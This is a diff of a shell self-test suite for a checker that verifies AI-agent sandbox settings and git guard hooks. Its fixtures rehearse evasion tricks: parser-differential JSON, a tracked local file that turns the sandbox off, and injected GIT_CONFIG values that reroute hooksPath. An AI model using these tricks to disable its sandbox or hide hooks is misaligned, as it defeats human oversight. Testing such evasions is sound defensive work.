+    if [ "$rc" -eq 1 ] && _has "$out" 'duplicate JSON key' && ! _has "$out" 'sandbox.enabled is not'; then echo "selftest PASS: boundary a duplicate key whose last copy passes -> FAIL (raw text read)"; else echo "selftest FAIL: boundary a duplicate key whose last copy passes should FAIL on the raw text (rc=$rc)"; st=1; fi
     _bd_mut enabled_false '.sandbox.enabled = false' 'sandbox.enabled is not the boolean true'
     _bd_mut enabled_string '.sandbox.enabled = "true"' 'sandbox.enabled is not the boolean true'
     _bd_mut enabled_missing 'del(.sandbox.enabled)' 'sandbox.enabled is not the boolean true'
@@ -1496,10 +1506,10 @@ selftest() {
     d="$base/bd_empty_dup"; mk_bd "$d" '.'
     { printf '{"sandbox":{},'; tail -n +2 "$d/.claude/settings.json"; } > "$d/s.new" && mv "$d/s.new" "$d/.claude/settings.json"
     if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -qF 'duplicate JSON key'; then echo "selftest PASS: boundary an empty sandbox object before the real one -> FAIL (empty containers close)"; else echo "selftest FAIL: boundary an empty sandbox object before the real one should FAIL as a duplicate key (rc=$rc)"; st=1; fi
+    if [ "$rc" -eq 1 ] && _has "$out" 'duplicate JSON key'; then echo "selftest PASS: boundary an empty sandbox object before the real one -> FAIL (empty containers close)"; else echo "selftest FAIL: boundary an empty sandbox object before the real one should FAIL as a duplicate key (rc=$rc)"; st=1; fi
     d="$base/bd_two_docs"; mk_bd "$d" '.'; printf '{}\n' >> "$d/.claude/settings.json"
     if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -qF 'more than one JSON document'; then echo "selftest PASS: boundary a second JSON document after the real one -> FAIL"; else echo "selftest FAIL: boundary a second JSON document should FAIL (rc=$rc)"; st=1; fi
+    if [ "$rc" -eq 1 ] && _has "$out" 'more than one JSON document'; then echo "selftest PASS: boundary a second JSON document after the real one -> FAIL"; else echo "selftest FAIL: boundary a second JSON document should FAIL (rc=$rc)"; st=1; fi
     # Parser differentials (security scan): where jq accepts a document that JSON.parse, the parser Claude Code reads settings with, refuses.
     # Each reproduction must FAIL as "not strict JSON", and its WITNESS neuters the strictness check in a subshell and shows the rest of the grader
     # passes the same document, so the cell is load-bearing (a mutant of the check goes red here). (_bd_lax is defined with the other helpers.)
@@ -1514,25 +1524,25 @@ selftest() {
     # with a \u escape parse the same in both (jq and the stream reader decode keys, nothing matches raw text); a repeated key spelled two ways is caught.
     printf '{"a":1,}\n' > "$base/bd_trailing.json"
     if out=$(_gw_boundary_grade "$base/bd_trailing.json" "the fixture" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -qF 'is not valid JSON'; then echo "selftest PASS: boundary a trailing comma -> FAIL (jq is stricter than JSON5, the safe direction)"; else echo "selftest FAIL: boundary a trailing comma should FAIL (rc=$rc)"; st=1; fi
+    if [ "$rc" -eq 1 ] && _has "$out" 'is not valid JSON'; then echo "selftest PASS: boundary a trailing comma -> FAIL (jq is stricter than JSON5, the safe direction)"; else echo "selftest FAIL: boundary a trailing comma should FAIL (rc=$rc)"; st=1; fi
     printf '{"a":1} // comment\n' > "$base/bd_comment.json"
     if out=$(_gw_boundary_grade "$base/bd_comment.json" "the fixture" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -qF 'is not valid JSON'; then echo "selftest PASS: boundary a comment -> FAIL (the safe direction)"; else echo "selftest FAIL: boundary a comment should FAIL (rc=$rc)"; st=1; fi
+    if [ "$rc" -eq 1 ] && _has "$out" 'is not valid JSON'; then echo "selftest PASS: boundary a comment -> FAIL (the safe direction)"; else echo "selftest FAIL: boundary a comment should FAIL (rc=$rc)"; st=1; fi
     d="$base/bd_crlf"; mk_bd "$d" '.'
     awk '{ printf "%s\r\n", $0 }' "$d/.claude/settings.json" > "$d/s.new" && mv "$d/s.new" "$d/.claude/settings.json"
     if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -qF 'PASS: boundary: the committed .claude/settings.json carries the full agent-boundary default'; then echo "selftest PASS: boundary a CRLF file grades like the LF file"; else echo "selftest FAIL: boundary a CRLF file should grade like the LF file (rc=$rc)"; st=1; fi
+    if [ "$rc" -eq 0 ] && _has "$out" 'PASS: boundary: the committed .claude/settings.json carries the full agent-boundary default'; then echo "selftest PASS: boundary a CRLF file grades like the LF file"; else echo "selftest FAIL: boundary a CRLF file should grade like the LF file (rc=$rc)"; st=1; fi
     d="$base/bd_escaped_key"; mk_bd "$d" '.'
     # The backslash comes from sprintf("%c", 92): awk implementations differ on how they treat a backslash-u inside a string or a replacement.
     awk '{ i = index($0, "\"denyRead\""); if (i) $0 = substr($0, 1, i) "deny" sprintf("%c", 92) "u0052ead" substr($0, i + 9); print }' "$d/.claude/settings.json" > "$d/s.new" && mv "$d/s.new" "$d/.claude/settings.json"
     # (the build check greps the backslash-free tail: the old check typed the escape as backslash-u and the tooling that wrote it decoded it to the plain key, so it looked for denyRead)
     if ! grep -qF 'u0052ead' "$d/.claude/settings.json"; then echo "selftest FAIL: boundary the escaped-key fixture was not built"; st=1; fi
     if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -qF 'PASS: boundary: the committed .claude/settings.json carries the full agent-boundary default'; then echo "selftest PASS: boundary a key spelled with a \\u escape grades as the decoded key"; else echo "selftest FAIL: boundary a key spelled with a \\u escape should grade as the decoded key (rc=$rc)"; st=1; fi
+    if [ "$rc" -eq 0 ] && _has "$out" 'PASS: boundary: the committed .claude/settings.json carries the full agent-boundary default'; then echo "selftest PASS: boundary a key spelled with a \\u escape grades as the decoded key"; else echo "selftest FAIL: boundary a key spelled with a \\u escape should grade as the decoded key (rc=$rc)"; st=1; fi
     d="$base/bd_escaped_dup"; mk_bd "$d" '.'
     { printf '{"sand\\u0062ox":{"enabled":false},'; tail -n +2 "$d/.claude/settings.json"; } > "$d/s.new" && mv "$d/s.new" "$d/.claude/settings.json"
     if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -qF 'duplicate JSON key'; then echo "selftest PASS: boundary a repeated key spelled with a \\u escape -> FAIL (keys are compared decoded)"; else echo "selftest FAIL: boundary a repeated key spelled with a \\u escape should FAIL as a duplicate (rc=$rc)"; st=1; fi
+    if [ "$rc" -eq 1 ] && _has "$out" 'duplicate JSON key'; then echo "selftest PASS: boundary a repeated key spelled with a \\u escape -> FAIL (keys are compared decoded)"; else echo "selftest FAIL: boundary a repeated key spelled with a \\u escape should FAIL as a duplicate (rc=$rc)"; st=1; fi
     # ── Round 3 (security FAIL, Architect steer): a CLOSED schema. Wrong-typed fields, a NUL byte, a looser allowWrite, a tracked opt-out and the
     # prototype-pollution names. Each cell fails on 462a9854 by construction (the old program read a present non-list as EMPTY, so it reported
     # nothing) and the record shows the old program passing these documents.
@@ -1648,7 +1658,7 @@ selftest() {
     _gw_git -C "$d" add -f .claude/settings.local.json >/dev/null 2>&1 || :
     _gw_git -C "$d" ls-files --error-unmatch .claude/settings.local.json >/dev/null 2>&1 || { echo "selftest FAIL: boundary the tracked-opt-out fixture was not built (git could not track settings.local.json)"; st=1; }
     if out=$(check_dir "$d" 2>&1 </dev/null); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -qF 'is tracked by git and turns the sandbox OFF'; then echo "selftest PASS: boundary a TRACKED settings.local.json that turns the sandbox off -> FAIL"; else echo "selftest FAIL: boundary a tracked settings.local.json that turns the sandbox off should FAIL (rc=$rc)"; st=1; fi
+    if [ "$rc" -eq 1 ] && _has "$out" 'is tracked by git and turns the sandbox OFF'; then echo "selftest PASS: boundary a TRACKED settings.local.json that turns the sandbox off -> FAIL"; else echo "selftest FAIL: boundary a tracked settings.local.json that turns the sandbox off should FAIL (rc=$rc)"; st=1; fi
     # A NUL byte: jq reads a trailing NUL and BSD awk truncates at it. Each shape must FAIL; the trailing one carries a witness (jq accepts it).
     _bd_nul leading_nul lead
     _bd_nul trailing_nul trail
@@ -1714,7 +1724,7 @@ selftest() {
     }
     _bp_cell() {  # <name> <dir> <expected rc> <expected substring>
       if out=$(_gw_boundary_patch_leg "$2" 2>&1 </dev/null); then rc=0; else rc=$?; fi
-      if [ "$rc" -eq "$3" ] && printf '%s' "$out" | grep -qF -- "$4"; then echo "selftest PASS: boundary patch $1"; else echo "selftest FAIL: boundary patch $1 should exit $3 naming '$4' (rc=$rc)"; st=1; fi
+      if [ "$rc" -eq "$3" ] && _has "$out" "$4"; then echo "selftest PASS: boundary patch $1"; else echo "selftest FAIL: boundary patch $1 should exit $3 naming '$4' (rc=$rc)"; st=1; fi
     }
     d="$base/bp_good"; _bp_mk "$d" '.'
     _bp_cell "a good patch (one file, applies, result passes, sha recorded) -> pending, wired" "$d" 0 'applies cleanly and its result passes the boundary grader'
@@ -1738,7 +1748,7 @@ selftest() {
       echo "selftest SKIP: the mktemp-failure cell (mktemp still works with TMPDIR unusable on this platform)"
     else
       if out=$( TMPDIR=/nonexistent-dir-for-the-selftest; export TMPDIR; _gw_boundary_leg "$d" 2>&1 </dev/null ); then rc=0; else rc=$?; fi
-      if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -qF 'could not merge settings.json with settings.local.json'; then echo "selftest PASS: boundary a merge that cannot create its scratch file -> FAIL"; else echo "selftest FAIL: boundary a merge that cannot create its scratch file should FAIL (rc=$rc)"; st=1; fi
+      if [ "$rc" -eq 1 ] && _has "$out" 'could not merge settings.json with settings.local.json'; then echo "selftest PASS: boundary a merge that cannot create its scratch file -> FAIL"; else echo "selftest FAIL: boundary a merge that cannot create its scratch file should FAIL (rc=$rc)"; st=1; fi
     fi
     d="$base/bp_bad_result"; _bp_mk "$d" '.sandbox.enabled = false'
     _bp_cell "whose result fails the grader -> FAIL" "$d" 1 'its result fails the boundary grader'
@@ -1770,11 +1780,11 @@ selftest() {
     # $1 = a ci.yml-shaped file; 0 only if the rc-3 line exits 1 (never 0) and the step has no continue-on-error
     _cr_l=$(grep -F 'sandbox enforcement SKIPPED' "$1" 2>/dev/null)
     [ -n "$_cr_l" ] || return 1
-    printf '%s' "$_cr_l" | grep -qF 'exit 0' && return 1
-    printf '%s' "$_cr_l" | grep -qF 'exit 1' || return 1
+    _has "$_cr_l" 'exit 0' && return 1
+    _has "$_cr_l" 'exit 1' || return 1
     _cr_b=$(awk '/- name: Sandbox enforcement/ {f=1} f && /^      - name:/ && !/Sandbox enforcement/ {f=0} f {print}' "$1")
     [ -n "$_cr_b" ] || return 1
-    printf '%s' "$_cr_b" | grep -qF 'continue-on-error' && return 1
+    _has "$_cr_b" 'continue-on-error' && return 1
     return 0
   }
   _gw_ci_fx() {  # $1 file, $2 the rc-3 exit, $3 an extra step line (may be empty)
@@ -1817,21 +1827,21 @@ selftest() {
     printf '{"permissions":{}}\n' > "$bo/noclaim/.claude/settings.json"
     printf '{"sandbox":\n' > "$bo/badjson/.claude/settings.json"
     if out=$(sh "$0" --boundary-only "$bo/claim" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q '^FAIL: boundary: denyRead lacks'; then echo "selftest PASS: --boundary-only on a settings.json that claims the boundary and fails the grader -> FAIL rc 1"; else echo "selftest FAIL: --boundary-only on a failing boundary claim should exit 1 with the grader's lines (rc=$rc): $out"; st=1; fi
+    if [ "$rc" -eq 1 ] && _has_line "$out" 'FAIL: boundary: denyRead lacks'; then echo "selftest PASS: --boundary-only on a settings.json that claims the boundary and fails the grader -> FAIL rc 1"; else echo "selftest FAIL: --boundary-only on a failing boundary claim should exit 1 with the grader's lines (rc=$rc): $out"; st=1; fi
     if out=$(sh "$0" --boundary-only "$bo/noclaim" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q '^N/A: boundary default'; then echo "selftest PASS: --boundary-only with no boundary claim -> N/A rc 0"; else echo "selftest FAIL: --boundary-only with no claim should be N/A rc 0 (rc=$rc): $out"; st=1; fi
+    if [ "$rc" -eq 0 ] && _has_line "$out" 'N/A: boundary default'; then echo "selftest PASS: --boundary-only with no boundary claim -> N/A rc 0"; else echo "selftest FAIL: --boundary-only with no claim should be N/A rc 0 (rc=$rc): $out"; st=1; fi
     if out=$(sh "$0" --boundary-only "$bo/empty" 2>&1); then rc=0; else rc=$?; fi
     if [ "$rc" -eq 0 ]; then echo "selftest PASS: --boundary-only with no settings.json -> rc 0 (nothing to grade)"; else echo "selftest FAIL: --boundary-only with no settings.json should exit 0 (rc=$rc): $out"; st=1; fi
     if out=$(sh "$0" --boundary-only "$bo/badjson" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 2 ] && printf '%s' "$out" | grep -q '^UNVERIFIED: jq could not read'; then echo "selftest PASS: --boundary-only on a settings file jq cannot read -> UNVERIFIED rc 2"; else echo "selftest FAIL: --boundary-only on an unreadable settings file should be UNVERIFIED rc 2 (rc=$rc): $out"; st=1; fi
+    if [ "$rc" -eq 2 ] && _has_line "$out" 'UNVERIFIED: jq could not read'; then echo "selftest PASS: --boundary-only on a settings file jq cannot read -> UNVERIFIED rc 2"; else echo "selftest FAIL: --boundary-only on an unreadable settings file should be UNVERIFIED rc 2 (rc=$rc): $out"; st=1; fi
     if out=$(PATH="$bo/nojq" /bin/sh "$0" --boundary-only "$bo/claim" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 2 ] && printf '%s' "$out" | grep -q '^UNVERIFIED: jq absent'; then echo "selftest PASS: --boundary-only without jq -> UNVERIFIED rc 2 (never a pass)"; else echo "selftest FAIL: --boundary-only without jq should be UNVERIFIED rc 2 (rc=$rc): $out"; st=1; fi
+    if [ "$rc" -eq 2 ] && _has_line "$out" 'UNVERIFIED: jq absent'; then echo "selftest PASS: --boundary-only without jq -> UNVERIFIED rc 2 (never a pass)"; else echo "selftest FAIL: --boundary-only without jq should be UNVERIFIED rc 2 (rc=$rc): $out"; st=1; fi
     # a jq that prints a PARTIAL result and then fails reads as exactly one UNVERIFIED line, never a PASS, never an abort
     bo_jq=$(command -v jq)
     printf '%s\n' '#!/bin/sh' 'echo "{\"sandbox\":"' 'exit 2' > "$bo/stub/jq"; chmod +x "$bo/stub/jq"
     if out=$(PATH="$bo/stub:$PATH" sh "$0" --boundary-only "$bo/claim" 2>&1); then rc=0; else rc=$?; fi
-    bo_n=$(printf '%s\n' "$out" | grep -c 'UNVERIFIED' || true)
-    if [ "$rc" -eq 2 ] && [ "$bo_n" -eq 1 ] && ! printf '%s' "$out" | grep -q '^PASS'; then echo "selftest PASS: --boundary-only with a partial-then-fail jq -> exactly one UNVERIFIED line, rc 2"; else echo "selftest FAIL: a partial-then-fail jq should give one UNVERIFIED line and rc 2 (rc=$rc, lines=$bo_n): $out ($bo_jq)"; st=1; fi
+    if bo_n=$(_grepx "$out" -c 'UNVERIFIED'); then :; fi
+    if [ "$rc" -eq 2 ] && [ "$bo_n" -eq 1 ] && ! _has_line "$out" 'PASS'; then echo "selftest PASS: --boundary-only with a partial-then-fail jq -> exactly one UNVERIFIED line, rc 2"; else echo "selftest FAIL: a partial-then-fail jq should give one UNVERIFIED line and rc 2 (rc=$rc, lines=$bo_n): $out ($bo_jq)"; st=1; fi
     # mutant boundary-only-skips-grader: with the one grader call replaced, the failing claim must no longer FAIL (the failing cell above goes red)
     sed '/MUT-BOUNDARY-ONLY/s/_gw_boundary_leg "\$1"/return 0/' "$0" > "$bo/m.sh"
     if cmp -s "$0" "$bo/m.sh"; then echo "selftest FAIL: mutant boundary-only-skips-grader did not apply"; st=1
@@ -1888,7 +1898,7 @@ selftest() {
     _gw_cmd_leg() {  # $1 label, $2 command, $3 kit|adopter, $4 expected rc, $5 expected fragment
       d="$base/cl_$1"; mk_cmd "$d" "$2" "$3"
       if out=$(_gw_canon_leg "$d" 2>&1); then rc=0; else rc=$?; fi
-      if [ "$rc" -eq "$4" ] && printf '%s' "$out" | grep -qF -- "$5"; then echo "selftest PASS: FC-L1 $1 -> rc $4"; else echo "selftest FAIL: FC-L1 $1 should give rc $4 naming '$5' (rc=$rc)"; st=1; fi
+      if [ "$rc" -eq "$4" ] && _has "$out" "$5"; then echo "selftest PASS: FC-L1 $1 -> rc $4"; else echo "selftest FAIL: FC-L1 $1 should give rc $4 naming '$5' (rc=$rc)"; st=1; fi
     }
     _gw_bare='sh "$CLAUDE_PROJECT_DIR/.claude/hooks/guard.sh"'
     _gw_nosuffix='[ -r "$CLAUDE_PROJECT_DIR/.claude/hooks/guard.sh" ] && sh "$CLAUDE_PROJECT_DIR/.claude/hooks/guard.sh"'
@@ -1908,10 +1918,10 @@ selftest() {
     # integrated: a bare adopter tree is still WARN-only through check_dir (rc 0), a bare kit tree is red
     d="$base/cl_int_adopter"; mk_cmd "$d" "$_gw_bare" adopter
     if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q '^WARN: a PreToolUse hook command'; then echo "selftest PASS: FC-L1 check_dir on an adopter tree with the bare command -> WARN, still wired"; else echo "selftest FAIL: FC-L1 an adopter tree with the bare command should WARN and stay wired (rc=$rc)"; st=1; fi
+    if [ "$rc" -eq 0 ] && _has_line "$out" 'WARN: a PreToolUse hook command'; then echo "selftest PASS: FC-L1 check_dir on an adopter tree with the bare command -> WARN, still wired"; else echo "selftest FAIL: FC-L1 an adopter tree with the bare command should WARN and stay wired (rc=$rc)"; st=1; fi
     d="$base/cl_int_kit"; mk_cmd "$d" "$_gw_bare" kit
     if out=$(check_dir "$d" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q '^FAIL: a PreToolUse hook command'; then echo "selftest PASS: FC-L1 check_dir on a kit tree with the bare command -> FAIL"; else echo "selftest FAIL: FC-L1 a kit tree with the bare command should FAIL (rc=$rc)"; st=1; fi
+    if [ "$rc" -eq 1 ] && _has_line "$out" 'FAIL: a PreToolUse hook command'; then echo "selftest PASS: FC-L1 check_dir on a kit tree with the bare command -> FAIL"; else echo "selftest FAIL: FC-L1 a kit tree with the bare command should FAIL (rc=$rc)"; st=1; fi
 
     # FC-L2: the brownfield fences. A kit fixture carries a copy of the real doc (or a mutant of it).
     _gw_bf_real="$_gw_root/docs/adoption/brownfield.md"
@@ -1930,7 +1940,7 @@ selftest() {
       _gw_bf_leg missing_doc 1 none
       d="$base/bf_adopter"; mkdir -p "$d"
       if out=$(_gw_brownfield_leg "$d" 2>&1); then rc=0; else rc=$?; fi
-      if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q '^N/A'; then echo "selftest PASS: FC-L2 an adopter tree -> N/A"; else echo "selftest FAIL: FC-L2 an adopter tree should be N/A (rc=$rc)"; st=1; fi
+      if [ "$rc" -eq 0 ] && _has_line "$out" 'N/A'; then echo "selftest PASS: FC-L2 an adopter tree -> N/A"; else echo "selftest FAIL: FC-L2 an adopter tree should be N/A (rc=$rc)"; st=1; fi
     else
       echo "selftest FAIL: FC-L2 cannot find docs/adoption/brownfield.md at $_gw_bf_real"; st=1
     fi
@@ -1947,7 +1957,7 @@ selftest() {
     }
     _gw_dn_leg() {  # $1 label, $2 expected rc, $3 expected output fragment
       if out=$(_gw_dayone_text_leg "$d" 2>&1); then rc=0; else rc=$?; fi
-      if [ "$rc" -eq "$2" ] && printf '%s' "$out" | grep -qF -- "$3"; then echo "selftest PASS: $1 -> rc $2"; else echo "selftest FAIL: $1 should give rc $2 naming '$3' (rc=$rc: $out)"; st=1; fi
+      if [ "$rc" -eq "$2" ] && _has "$out" "$3"; then echo "selftest PASS: $1 -> rc $2"; else echo "selftest FAIL: $1 should give rc $2 naming '$3' (rc=$rc: $out)"; st=1; fi
     }
     _gw_dn_fx real
     _gw_dn_leg 'GNL-D1/D2/D3/D5 the real day-one text' 0 'PASS: the day-one launch-directory text is in place'
@@ -1980,7 +1990,7 @@ selftest() {
     _gw_dn_leg 'GNL-D5 mutant: the SECURITY entry heading removed from the CHANGELOG' 1 'has no SECURITY entry'
     d="$base/dn_adopter"; mkdir -p "$d"
     if out=$(_gw_dayone_text_leg "$d" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q '^N/A'; then echo "selftest PASS: GNL-D an adopter tree -> N/A"; else echo "selftest FAIL: GNL-D an adopter tree should be N/A (rc=$rc)"; st=1; fi
+    if [ "$rc" -eq 0 ] && _has_line "$out" 'N/A'; then echo "selftest PASS: GNL-D an adopter tree -> N/A"; else echo "selftest FAIL: GNL-D an adopter tree should be N/A (rc=$rc)"; st=1; fi
 
     # GNL-D4: the cap is the measured region plus the bite. The parse is exercised on canned agents-brief lines, and the
     # live tree's own number is checked by the leg itself.
@@ -1988,14 +1998,14 @@ selftest() {
     if out=$(_gw_ec_bite_check "PASS: the entry contract measures 2674 bytes (cap $((2674 + GW_EC_BITE)))" 2>&1); then rc=0; else rc=$?; fi
     if [ "$rc" -eq 0 ]; then echo "selftest PASS: GNL-D4 cap = measured + $GW_EC_BITE"; else echo "selftest FAIL: GNL-D4 cap = measured + $GW_EC_BITE should pass (rc=$rc)"; st=1; fi
     if out=$(_gw_ec_bite_check "PASS: the entry contract measures 2674 bytes (cap $((2674 + GW_EC_BITE + 1)))" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -qF '(GNL-D4)'; then echo "selftest PASS: GNL-D4 mutant: cap one byte over the bite -> FAIL"; else echo "selftest FAIL: GNL-D4 a cap one byte over measured + $GW_EC_BITE should FAIL (rc=$rc)"; st=1; fi
+    if [ "$rc" -eq 1 ] && _has "$out" '(GNL-D4)'; then echo "selftest PASS: GNL-D4 mutant: cap one byte over the bite -> FAIL"; else echo "selftest FAIL: GNL-D4 a cap one byte over measured + $GW_EC_BITE should FAIL (rc=$rc)"; st=1; fi
     if out=$(_gw_ec_bite_check "PASS: the entry contract measures 2674 bytes (cap $((2674 + GW_EC_BITE - 1)))" 2>&1); then rc=0; else rc=$?; fi
     if [ "$rc" -eq 1 ]; then echo "selftest PASS: GNL-D4 mutant: cap one byte under the bite -> FAIL"; else echo "selftest FAIL: GNL-D4 a cap under measured + $GW_EC_BITE should FAIL (rc=$rc)"; st=1; fi
     if out=$(_gw_ec_bite_check 'no measurement line at all' 2>&1); then rc=0; else rc=$?; fi
     if [ "$rc" -eq 1 ]; then echo "selftest PASS: GNL-D4 no measurement line -> FAIL (never a pass)"; else echo "selftest FAIL: GNL-D4 a missing measurement line should FAIL (rc=$rc)"; st=1; fi
     d="$base/dn_ec_adopter"; mkdir -p "$d"
     if out=$(_gw_ec_bite_leg "$d" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q '^N/A'; then echo "selftest PASS: GNL-D4 an adopter tree -> N/A"; else echo "selftest FAIL: GNL-D4 an adopter tree should be N/A (rc=$rc)"; st=1; fi
+    if [ "$rc" -eq 0 ] && _has_line "$out" 'N/A'; then echo "selftest PASS: GNL-D4 an adopter tree -> N/A"; else echo "selftest FAIL: GNL-D4 an adopter tree should be N/A (rc=$rc)"; st=1; fi
   else
     echo "selftest FAIL: FC-L1/FC-L2/GNL need jq (jq absent, so the canonical-command and day-one locks were not exercised)"; st=1
   fi
@@ -2032,25 +2042,25 @@ selftest() {
   # fresh-OK: qualifying + git + FRESH installed rung -> wired, FRESH asserted.
   d="$base/rung_fresh"; mk_repo "$d" "$MATCHER" >/dev/null
   if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
-  if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q 'FRESH'; then
+  if [ "$rc" -eq 0 ] && _has "$out" 'FRESH'; then
     echo "selftest PASS: rung fresh -> wired, FRESH asserted"
   else echo "selftest FAIL: rung fresh should be wired+FRESH (rc=$rc): $out"; st=1; fi
 
   # REV M4 + SEC L4 (review round 1, item 7): the OK summary discloses the foreign-hook lane too.
-  if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q 'preserved foreign hook (uncertified)'; then
+  if [ "$rc" -eq 0 ] && _has "$out" 'preserved foreign hook (uncertified)'; then
     echo "selftest PASS: OK summary discloses the foreign-hook lane"
   else echo "selftest FAIL: OK summary should disclose the foreign-hook lane (rc=$rc): $out"; st=1; fi
 
   # absent-RED: qualifying + git, nothing installed at the resolved hook path.
   d="$base/rung_absent"; rh=$(mk_repo "$d" "$MATCHER"); rm -f "$rh"
   if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
-  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'not installed at'; then
+  if [ "$rc" -eq 1 ] && _has "$out" 'not installed at'; then
     echo "selftest PASS: rung absent -> FAIL (absent verdict)"
   else echo "selftest FAIL: rung absent should FAIL with an absent verdict (rc=$rc): $out"; st=1; fi
 
   # REV M2 (review round 1, item 6): only the rung leg failed here (the PreToolUse legs are fine) —
   # the summary must NAME the failed rung, never claim runtime protection is absent altogether.
-  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'guard-wired: FAIL — a guard rung is not wired'; then
+  if [ "$rc" -eq 1 ] && _has "$out" 'guard-wired: FAIL — a guard rung is not wired'; then
     echo "selftest PASS: rung-only failure summary names the rung, not blanket 'unprotected'"
   else echo "selftest FAIL: rung-only failure summary should name the rung (rc=$rc): $out"; st=1; fi
 
@@ -2059,7 +2069,7 @@ selftest() {
   d="$base/rung_stale"; rh=$(mk_repo "$d" "$MATCHER")
   printf '#!/bin/sh\n# KIT_GUARD_CORE\necho installedX\n' > "$rh"; chmod +x "$rh"
   if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
-  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'STALE'; then
+  if [ "$rc" -eq 1 ] && _has "$out" 'STALE'; then
     echo "selftest PASS: rung stale (marker present, one byte differs) -> FAIL (STALE verdict)"
   else echo "selftest FAIL: rung stale should FAIL with a STALE verdict (rc=$rc): $out"; st=1; fi
 
@@ -2069,7 +2079,7 @@ selftest() {
   # FRESH fixture's git-path/config and printed FRESH instead (measured on a scratchpad copy of the
   # pre-fix file; see the build's own verification report for the before/after transcript).
   if out=$(CI='' GITHUB_ACTIONS='' GIT_DIR="$base/rung_fresh/.git" sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
-  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'STALE'; then
+  if [ "$rc" -eq 1 ] && _has "$out" 'STALE'; then
     echo "selftest PASS: rung stale under a foreign GIT_DIR -> STALE verdict still fires (env-reroute immune)"
   else echo "selftest FAIL: rung stale under a foreign GIT_DIR should still STALE (rc=$rc): $out"; st=1; fi
 
@@ -2080,7 +2090,7 @@ selftest() {
   # the genuinely-STALE fixture into the disclosed "core.hooksPath redirects hooks to ..." N/A
   # instead of the STALE verdict — the STALE verdict must still fire.
   if out=$(CI='' GITHUB_ACTIONS='' GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0=/tmp/nowhere sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
-  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'STALE'; then
+  if [ "$rc" -eq 1 ] && _has "$out" 'STALE'; then
     echo "selftest PASS: rung stale under an injected GIT_CONFIG_COUNT hooksPath -> STALE verdict still fires (config-injection immune)"
   else echo "selftest FAIL: rung stale under an injected GIT_CONFIG_COUNT hooksPath should still STALE (rc=$rc): $out"; st=1; fi
 
@@ -2091,14 +2101,14 @@ selftest() {
   # unset list at all, muting the leg to the disclosed N/A instead of the genuine STALE verdict —
   # the STALE verdict must still fire.
   if out=$(CI='' GITHUB_ACTIONS='' GIT_CONFIG_PARAMETERS="'core.hookspath'='/tmp/nowhere'" sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
-  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'STALE'; then
+  if [ "$rc" -eq 1 ] && _has "$out" 'STALE'; then
     echo "selftest PASS: rung stale under an injected GIT_CONFIG_PARAMETERS hooksPath -> STALE verdict still fires (config-injection immune)"
   else echo "selftest FAIL: rung stale under an injected GIT_CONFIG_PARAMETERS hooksPath should still STALE (rc=$rc): $out"; st=1; fi
 
   # non-exec-RED: installed, matches, marked — but not executable; git silently ignores it.
   d="$base/rung_nonexec"; rh=$(mk_repo "$d" "$MATCHER"); chmod -x "$rh"
   if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
-  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'NOT EXECUTABLE'; then
+  if [ "$rc" -eq 1 ] && _has "$out" 'NOT EXECUTABLE'; then
     echo "selftest PASS: rung non-executable -> FAIL"
   else echo "selftest FAIL: rung non-executable should FAIL (rc=$rc): $out"; st=1; fi
 
@@ -2106,28 +2116,28 @@ selftest() {
   d="$base/rung_foreign"; rh=$(mk_repo "$d" "$MATCHER")
   printf '#!/bin/sh\necho legacy hook\n' > "$rh"; chmod +x "$rh"
   if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
